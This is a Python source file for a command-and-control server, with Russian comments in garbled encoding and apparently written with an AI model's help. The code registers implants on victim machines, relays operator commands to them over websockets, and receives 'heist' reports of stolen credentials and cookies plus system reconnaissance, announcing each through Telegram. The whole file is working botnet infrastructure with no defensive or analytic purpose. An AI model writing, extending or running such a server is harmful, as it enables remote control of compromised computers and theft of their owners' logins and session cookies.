# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 3.1 —Å API –∏ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º —Å–æ–æ–±—â–µ–Ω–∏–π) ---
import asyncio
import json
import os
import threading
import urllib.parse
import urllib.request
from aiohttp import web

# –Ø –≤—ã–Ω–µ—Å —ç—Ç–æ –≤ –æ—Ç–¥–µ–ª—å–Ω—ã–π —Ñ–∞–π–ª, —á—Ç–æ–±—ã –Ω–µ –¥—É–±–ª–∏—Ä–æ–≤–∞—Ç—å –∫–æ–¥. –£–±–µ–¥–∏—Å—å, —á—Ç–æ –æ–Ω –µ—Å—Ç—å.
# –ï—Å–ª–∏ –µ–≥–æ –Ω–µ—Ç, —Å–∫–æ–ø–∏—Ä—É–π —Ñ—É–Ω–∫—Ü–∏—é send_telegram_message –∏–∑ –ø—Ä–æ—à–ª–æ–≥–æ –æ—Ç–≤–µ—Ç–∞.
from utils import send_telegram_message, get_secret
import settings

IMPLANTS, OPERATOR = {}, None

async def handle_report(request):
    try:
        data = await request.json()
        bot_id = data.get("bot_id", "Unknown")
        report_type = data.get("type", "report")
        hostname = bot_id.replace("implant_", "")

        # –£–≤–µ–¥–æ–º–ª—è–µ–º –æ –ø–æ–ª—É—á–µ–Ω–∏–∏ –æ—Ç—á–µ—Ç–∞
        print(f"[+] –ü–æ–ª—É—á–µ–Ω –æ—Ç—á–µ—Ç '{report_type}' –æ—Ç {bot_id}")

        # –¢–µ–ø–µ—Ä—å —Å–µ—Ä–≤–µ—Ä —Å–∞–º —Ä–µ—à–∞–µ—Ç, —á—Ç–æ –¥–µ–ª–∞—Ç—å —Å –¥–∞–Ω–Ω—ã–º–∏
        if report_type == "heist_report":
            creds = data.get("credentials")
            cookies = data.get("cookies")
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —á—Ç–æ-—Ç–æ —Å—É—â–µ—Å—Ç–≤–µ–Ω–Ω–æ–µ –≤ –æ—Ç—á–µ—Ç–∞—Ö
            if creds and len(creds.splitlines()) > 2:
                 send_telegram_message(f"üîë –ü–æ–ª—É—á–µ–Ω—ã –£–ß–ï–¢–ù–´–ï –î–ê–ù–ù–´–ï –æ—Ç {hostname}")
                 # –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞ –≤ —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
                 # with open(f"{hostname}_creds.txt", "w", encoding="utf-8") as f:
                 #     f.write(creds)
            if cookies and len(cookies.splitlines()) > 2:
                 send_telegram_message(f"üç™ –ü–æ–ª—É—á–µ–Ω—ã –ö–£–ö–ò –æ—Ç {hostname}")
                 # –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –º–æ–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –∫—É–∫–∏
                 # with open(f"{hostname}_cookies.txt", "w", encoding="utf-8") as f:
                 #     f.write(cookies)

        elif report_type == "recon_report":
            send_telegram_message(f"üíª –ü–æ–ª—É—á–µ–Ω –°–ò–°–¢–ï–ú–ù–´–ô –û–¢–ß–ï–¢ –æ—Ç {hostname}")
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–π –æ—Ç—á–µ—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –∞–Ω–∞–ª–∏–∑–∞
            # with open(f"{hostname}_recon.json", "w", encoding="utf-8") as f:
            #     json.dump(data, f, indent=2, ensure_ascii=False)

        return web.Response(status=200, text="Report received")
    except Exception as e:
        print(f"[!] –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—Ç—á–µ—Ç–∞: {e}")
        return web.Response(status=500, text="Server error")

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = {
                "ws": ws,             "files": initial_msg.get('files', {}),
                "volume": initial_msg.get('current_volume', 50)
            }
            hostname = client_id.replace("implant_", "") # <-- –ü–æ–ª—É—á–∞–µ–º —á–∏—Å—Ç–æ–µ –∏–º—è
            print(f"[+] –ù–æ–≤—ã–π –∏–º–ø–ª–∞–Ω—Ç –æ–Ω–ª–∞–π–Ω: {client_id}")
            # --- –¢–í–û–Ø –ò–ó–ú–ï–ù–ï–ù–ù–ê–Ø –°–¢–†–û–ö–ê ---
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù:(–∏–º—è –ø–∫({hostname}))")
            # ------------------------------------
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping':
                    await ws.send_str('pong')
                    continue
                data = json.loads(msg.data)
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {
                            "files": IMPLANTS[target_id].get("files"),
                            "volume": IMPLANTS[target_id].get("volume")
                        }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            if OPERATOR:
                                await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except Exception:
        pass # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è, —á—Ç–æ–±—ã –Ω–µ —Å–ø–∞–º–∏—Ç—å –≤ –ª–æ–≥
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "") # <-- –ü–æ–ª—É—á–∞–µ–º —á–∏—Å—Ç–æ–µ –∏–º—è
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}")
            # --- –ò –í–¢–û–†–ê–Ø –¢–í–û–Ø –ò–ó–ú–ï–ù–ï–ù–ù–ê–Ø –°–¢–†–û–ö–ê ---
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø:(–∏–º—è –ø–∫({hostname}))")
            # --------------------------------------
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        bot_ids = list(IMPLANTS.keys())
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})

async def http_handler(request):
    # –£–±–µ–¥–∏—Å—å, —á—Ç–æ index.html –ª–µ–∂–∏—Ç –≤ —Ç–æ–π –∂–µ –ø–∞–ø–∫–µ, —á—Ç–æ –∏ c2_server.py
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    app.router.add_post('/api/report', handle_report) # <-- –ù–∞—à –º–∞—Ä—à—Ä—É—Ç –¥–ª—è –æ—Ç—á–µ—Ç–æ–≤
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V3.1) ONLINE ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä—É—á–Ω—É—é.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
